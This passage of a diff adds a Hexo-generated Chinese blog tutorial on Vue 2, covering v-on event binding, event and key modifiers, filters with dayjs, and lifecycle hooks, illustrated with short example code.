+</tr>
+</thead>
+<tbody><tr>
+<td>onclick</td>
+<td>v-on:click</td>
+</tr>
+<tr>
+<td>oninput</td>
+<td>v-on:input</td>
+</tr>
+<tr>
+<td>onkeyup</td>
+<td>v-on:keyup</td>
+</tr>
+</tbody></table>
+<h2 id="1-v-on"><a href="#1-v-on" class="headerlink" title="1. v-on"></a>1. v-on</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h1</span>&gt;</span>count = &#123;&#123;count&#125;&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">button</span> <span class="attr">v-on:click</span>=<span class="string">&quot;sub&quot;</span>&gt;</span>-<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;add&quot;</span>&gt;</span>+<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">	<span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">		<span class="attr">el</span>:<span class="string">&quot;#root&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">		<span class="title function_">data</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">			<span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="language-javascript">				<span class="attr">count</span>: <span class="number">0</span>,</span></span><br><span class="line"><span class="language-javascript">			&#125;</span></span><br><span class="line"><span class="language-javascript">		&#125;,</span></span><br><span class="line"><span class="language-javascript">		<span class="attr">methods</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">			<span class="title function_">add</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">				<span class="variable language_">this</span>.<span class="property">count</span>++;</span></span><br><span class="line"><span class="language-javascript">			&#125;,</span></span><br><span class="line"><span class="language-javascript">			<span class="title function_">sub</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">				<span class="variable language_">this</span>.<span class="property">count</span>--;</span></span><br><span class="line"><span class="language-javascript">			&#125;</span></span><br><span class="line"><span class="language-javascript">		&#125;</span></span><br><span class="line"><span class="language-javascript">	&#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>如果我们的事件要传递参数，代码如下：</strong></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;method1&quot;</span>&gt;</span>点我1<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;method2()&quot;</span>&gt;</span>点我2<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">	<span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">		<span class="attr">el</span>:<span class="string">&#x27;#root&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">		<span class="attr">methods</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">			<span class="title function_">method1</span>(<span class="params">arg1</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">				<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;method1: &quot;</span> , arg1);</span></span><br><span class="line"><span class="language-javascript">			&#125;,</span></span><br><span class="line"><span class="language-javascript">			<span class="title function_">method2</span>(<span class="params">arg1</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">				<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;method2: &quot;</span> , arg1);</span></span><br><span class="line"><span class="language-javascript">			&#125;</span></span><br><span class="line"><span class="language-javascript">		&#125;</span></span><br><span class="line"><span class="language-javascript">	&#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815144317.png" alt="  "></p>
+<hr>
+<p><strong>在使用 v-on 绑定事件时：</strong></p>
+<ul>
+<li>如果事件函数后有括号，如：@click&#x3D;”method1()”,则默认什么都不传递</li>
+<li>如果事件函数后无括号，如:@click&#x3D;”method2” ,则默认传递<code>事件对象</code></li>
+</ul>
+<p><strong>当我们带参数又要带有事件参数时,我们要使用 <code>$event</code>：</strong></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;method3($event,2,3,4)&quot;</span>&gt;</span>点我3<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">	<span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">		<span class="attr">el</span>:<span class="string">&#x27;#root&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">		<span class="attr">methods</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">			<span class="title function_">method3</span>(<span class="params">event, a, b, c</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">				<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;event = &quot;</span> , event);</span></span><br><span class="line"><span class="language-javascript">				<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;a = &quot;</span> , a);</span></span><br><span class="line"><span class="language-javascript">				<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;b = &quot;</span> , b);</span></span><br><span class="line"><span class="language-javascript">				<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;c = &quot;</span> , c);</span></span><br><span class="line"><span class="language-javascript">			&#125;</span></span><br><span class="line"><span class="language-javascript">		&#125;</span></span><br><span class="line"><span class="language-javascript">	&#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815144319.png" alt="  "></p>
+<hr>
+<h2 id="2-事件修饰符"><a href="#2-事件修饰符" class="headerlink" title="2. 事件修饰符"></a>2. 事件修饰符</h2><p><strong>Vue中的事件修饰符：</strong></p>
+<ul>
+<li><code>prevent</code>：阻止默认事件（常用）</li>
+<li><code>stop</code>：阻止事件冒泡，也就是当前元素发生事件,但当前元素的父元素不发生该事件（常用）</li>
+<li><code>once</code>：事件只触发一次（常用）</li>
+<li><code>capture</code>：使用事件捕获模式, 主动获取子元素发生事件, 把获取到的事件当自己的事件执行</li>
+<li><code>self</code>：只有 <code>event.target</code> 是当前操作的元素时才触发事件</li>
+<li><code>passive</code>：事件的默认行为立即执行，无需等待事件回调执行完毕</li>
+</ul>
+<p>修饰符可以连续写，比如可以这么用：<code>@click.prevent.stop=&quot;showInfo&quot;</code></p>
+<hr>
+<h2 id="3-键盘事件"><a href="#3-键盘事件" class="headerlink" title="3. 键盘事件"></a>3. 键盘事件</h2><p><strong>键盘上的每个按键都有自己的名称和编码，例如：Enter（13）。而Vue还对一些常用按键起了别名方便使用。</strong></p>
+<blockquote>
+<h2 id="Vue中常用的按键别名：-回车：enter-删除：delete-捕获“删除”和“退格”键-退出：esc-空格：space-换行：tab-特殊，必须配合keydown去使用-上：up-下：down-左：left-右：right"><a href="#Vue中常用的按键别名：-回车：enter-删除：delete-捕获“删除”和“退格”键-退出：esc-空格：space-换行：tab-特殊，必须配合keydown去使用-上：up-下：down-左：left-右：right" class="headerlink" title="Vue中常用的按键别名：- 回车：enter- 删除：delete (捕获“删除”和“退格”键)- 退出：esc- 空格：space- 换行：tab (特殊，必须配合keydown去使用)- 上：up- 下：down- 左：left- 右：right"></a><strong>Vue中常用的按键别名：</strong><br>- 回车：enter<br>- 删除：delete <strong>(捕获“删除”和“退格”键)</strong><br>- 退出：esc<br>- 空格：space<br>- 换行：tab <strong>(特殊，必须配合<code>keydown</code>去使用)</strong><br>- 上：up<br>- 下：down<br>- 左：left<br>- 右：right</h2><p><strong>注意</strong>： </p>
+<p>系统修饰键（用法特殊）：<code>ctrl</code>、<code>alt</code>、<code>shift</code>、<code>meta</code> </p>
+<ul>
+<li>配合<code>keyup</code>使用：按下修饰键的同时，再按下其他键，随后释放其他键，事件才被触发 </li>
+<li>配合<code>keydown</code>使用：正常触发事件</li>
+</ul>
+<hr>
+<p>可以使用<code>keyCode</code>去指定具体的按键，比如：@keydown.13&#x3D;”showInfo”</p>
+<hr>
+<p><code>Vue.config.keyCodes.自定义键名 = 键码</code>，可以自定义按键别名</p>
+</blockquote>
+<hr>
+<h1 id="八、过滤器"><a href="#八、过滤器" class="headerlink" title="八、过滤器"></a>八、过滤器</h1><h2 id="1-过滤器简介"><a href="#1-过滤器简介" class="headerlink" title="1. 过滤器简介"></a>1. 过滤器简介</h2><ul>
+<li><p>在官方文档中，是这样说明的：可被用于一些常见的文本格式化，vue中过滤器的作用可被用于一些常见的文本格式化。（也就是修饰文本，但是文本内容不会改变）</p>
+</li>
+<li><p>通俗点说过滤器就是用来筛选出符合条件的，丢弃不符合条件的</p>
+</li>
+<li><p>过滤器分为<strong>全局过滤器</strong>与<strong>局部过滤器</strong></p>
+</li>
+</ul>
+<p><strong>过滤器：</strong></p>
+<ul>
+<li><p><strong>定义</strong>：对要显示的数据进行特定格式化后再显示（适用于一些简单逻辑的处理）。</p>
+</li>
+<li><p><strong>语法</strong>：</p>
+</li>
+</ul>
+<p> ① 注册过滤器：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">	<span class="comment">//全局过滤器</span></span></span><br><span class="line"><span class="language-javascript">	<span class="title class_">Vue</span>.<span class="title function_">filter</span>(<span class="string">&#x27;过滤器1&#x27;</span>,<span class="keyword">function</span>(<span class="params">value</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">		<span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">	&#125;)</span></span><br><span class="line"><span class="language-javascript">	</span></span><br><span class="line"><span class="language-javascript">	<span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">		<span class="attr">el</span>:<span class="string">&#x27;#root&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">		</span></span><br><span class="line"><span class="language-javascript">		<span class="comment">//局部过滤器</span></span></span><br><span class="line"><span class="language-javascript">		<span class="attr">filters</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">			过滤器<span class="number">2</span>(value)&#123;</span></span><br><span class="line"><span class="language-javascript">				<span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">			&#125;</span></span><br><span class="line"><span class="language-javascript">		&#125;</span></span><br><span class="line"><span class="language-javascript">	&#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p> ② 使用过滤器：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span> &#123;&#123; xxx | 过滤器&#125;&#125; <span class="tag">&lt;/<span class="name">h1</span>&gt;</span> </span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">:href</span> = <span class="string">&quot;xxx | 过滤器名&quot;</span> &gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<blockquote>
+<p><strong>备注：</strong></p>
+<ul>
+<li>过滤器可以接收额外参数，多个过滤器也可以串联</li>
+<li>过滤器并没有改变原本的数据，而是产生新的对应的数据</li>
+</ul>
+</blockquote>
+<h2 id="2-过滤器案例"><a href="#2-过滤器案例" class="headerlink" title="2. 过滤器案例"></a>2. 过滤器案例</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span> /&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">title</span>&gt;</span>过滤器<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;../js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.bootcdn.net/ajax/libs/dayjs/1.10.6/dayjs.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">h2</span>&gt;</span>时间<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">h3</span>&gt;</span>当前时间戳：&#123;&#123;time&#125;&#125;<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">h3</span>&gt;</span>转换后时间：&#123;&#123;time | timeFormater()&#125;&#125;<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">h3</span>&gt;</span>转换后时间：&#123;&#123;time | timeFormater(&#x27;YYYY-MM-DD HH:mm:ss&#x27;)&#125;&#125;<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">h3</span>&gt;</span>截取年月日：&#123;&#123;time | timeFormater() | mySlice&#125;&#125;<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">	<span class="comment">//全局过滤器</span></span></span><br><span class="line"><span class="language-javascript">	<span class="title class_">Vue</span>.<span class="title function_">filter</span>(<span class="string">&#x27;mySlice&#x27;</span>,<span class="keyword">function</span>(<span class="params">value</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">		<span class="keyword">return</span> value.<span class="title function_">slice</span>(<span class="number">0</span>,<span class="number">11</span>)</span></span><br><span class="line"><span class="language-javascript">	&#125;)</span></span><br><span class="line"><span class="language-javascript">	</span></span><br><span class="line"><span class="language-javascript">	<span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">		<span class="attr">el</span>:<span class="string">&#x27;#root&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">		<span class="attr">data</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">			<span class="attr">time</span>:<span class="number">1658929744</span>,</span></span><br><span class="line"><span class="language-javascript">		&#125;,</span></span><br><span class="line"><span class="language-javascript">		</span></span><br><span class="line"><span class="language-javascript">		<span class="comment">//局部过滤器</span></span></span><br><span class="line"><span class="language-javascript">		<span class="attr">filters</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">			<span class="title function_">timeFormater</span>(<span class="params">value, str=<span class="string">&quot;YYYY年MM月DD日 HH:mm:ss&quot;</span></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">				<span class="keyword">return</span> <span class="title function_">dayjs</span>(value).<span class="title function_">format</span>(str)</span></span><br><span class="line"><span class="language-javascript">			&#125;</span></span><br><span class="line"><span class="language-javascript">		&#125;</span></span><br><span class="line"><span class="language-javascript">	&#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815144325.png" alt="  "></p>
+<hr>
+<h1 id="九、Vue生命周期"><a href="#九、Vue生命周期" class="headerlink" title="九、Vue生命周期"></a>九、Vue生命周期</h1><p><strong>（1）什么是Vue生命周期?</strong></p>
+<p>官网的解释：&#x3D;&#x3D;Vue 实例从创建到销毁的过程，就是生命周期&#x3D;&#x3D;。也就是从开始创建、初始化数据、编译模板、挂载Dom→渲染、更新→渲染、卸载等一系列过程，我们称这是 Vue 的生命周期。</p>
+<hr>
+<p><strong>（2）vue生命周期的作用是什么?</strong></p>
+<p>Vue生命周期中有多个事件钩子，让我们在控制整个Vue实例过程时更容易形成好的逻辑。</p>
+<hr>
+<p><strong>（3）vue生命周期总共有几个阶段?</strong></p>
+<p>可以总共分为8个阶段：</p>
+<ul>
+<li>创建前&#x2F;后</li>
+<li>载入前&#x2F;后</li>
+<li>更新前&#x2F;后</li>
+<li>销毁前&#x2F;后</li>
+</ul>
+<hr>
+<p><strong>（4）第一次页面加载会触发哪几个钩子?</strong></p>
+<p>第一次页面加载时会触发 <code>beforeCreate</code>, <code>created</code>, <code>beforeMount</code>, <code>mounted</code> 这几个钩子</p>
+<hr>
+<p><strong>（5）DOM 渲染在 哪个周期中就已经完成?</strong></p>
+<p>DOM 渲染在 <code>mounted</code> 中就已经完成了。</p>
+<hr>
+<p><strong>（6）简单描述每个周期具体适合哪些场景?</strong></p>
+<p>生命周期钩子的一些使用方法：</p>
+<p><code>beforecreate</code> : 可以在此阶段加loading事件，在加载实例时触发；</p>
+<p><code>created</code> : 初始化完成时的事件写在这里，如在这结束loading事件，异步请求也适宜在这里调用；</p>
+<p><code>mounted</code> : 挂载元素，获取到DOM节点；</p>
+<p><code>updated</code> : 如果对数据统一处理，在这里写上相应函数；</p>
+<p><code>beforeDestroy</code> : 可以做一个确认停止事件的确认框；</p>
+<p><code>nextTick</code> : 更新数据后立即操作dom；</p>
+<p>​	</p>
+<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815144330.png" alt="  "></p>
+<p>常用的生命周期钩子：</p>
+<ul>
+<li><p><code>mounted</code>：发送ajax请求、启动定时器、绑定自定义事件、订阅消息等初始化操作</p>
+</li>
+<li><p><code>beforeDestroy</code>：清除定时器、解绑自定义事件、取消订阅消息等收尾工作</p>
+</li>
+</ul>
+<p>关于销毁Vue实例：</p>
+<ul>
+<li><p>销毁后借助Vue开发者工具看不到任何信息</p>
+</li>
+<li><p>销毁后自定义事件会失效，但原生DOM事件依然有效</p>
+</li>
+<li><p>一般不会在beforeDestroy操作数据，因为即便操作数据，也不会再触发更新流程了</p>
+</li>
+</ul>
+<p><strong>测试案例</strong></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">title</span>&gt;</span>生命周期测试案例<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">p</span>&gt;</span>&#123;&#123;message&#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;changeMsg&quot;</span>&gt;</span>改变msg<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">	<span class="keyword">var</span> vm = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">		<span class="attr">el</span>: <span class="string">&#x27;#app&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">		<span class="attr">data</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">			<span class="attr">message</span>: <span class="string">&#x27;你好呀~~~&#x27;</span></span></span><br><span class="line"><span class="language-javascript">		&#125;,</span></span><br><span class="line"><span class="language-javascript">		<span class="attr">methods</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">			changeMsg () &#123;</span></span><br><span class="line"><span class="language-javascript">				<span class="variable language_">this</span>.<span class="property">message</span> = <span class="string">&#x27;拜拜咯~~~&#x27;</span></span></span><br><span class="line"><span class="language-javascript">			&#125;</span></span><br><span class="line"><span class="language-javascript">		&#125;,</span></span><br><span class="line"><span class="language-javascript">		<span class="comment">// 生命周期钩子</span></span></span><br><span class="line"><span class="language-javascript">		<span class="title function_">beforeCreate</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">			<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;------初始化前------&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">			<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;msg = &quot;</span>, <span class="variable language_">this</span>.<span class="property">message</span>)</span></span><br><span class="line"><span class="language-javascript">			<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;el = &quot;</span>, <span class="variable language_">this</span>.<span class="property">$el</span>)</span></span><br><span class="line"><span class="language-javascript">		&#125;,</span></span><br><span class="line"><span class="language-javascript">		created () &#123;</span></span><br><span class="line"><span class="language-javascript">			<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;------初始化完成------&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">			<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;msg = &quot;</span>, <span class="variable language_">this</span>.<span class="property">message</span>)</span></span><br><span class="line"><span class="language-javascript">			<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;el = &quot;</span>, <span class="variable language_">this</span>.<span class="property">$el</span>)</span></span><br><span class="line"><span class="language-javascript">		&#125;,</span></span><br><span class="line"><span class="language-javascript">		beforeMount () &#123;</span></span><br><span class="line"><span class="language-javascript">			<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;------挂载前---------&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">			<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;msg = &quot;</span>, <span class="variable language_">this</span>.<span class="property">message</span>)</span></span><br><span class="line"><span class="language-javascript">			<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;el = &quot;</span>, <span class="variable language_">this</span>.<span class="property">$el</span>)</span></span><br><span class="line"><span class="language-javascript">		&#125;,</span></span><br><span class="line"><span class="language-javascript">		mounted () &#123;</span></span><br><span class="line"><span class="language-javascript">			<span class="variable language_">console</span>.<span class="title function_">log</span>(<span 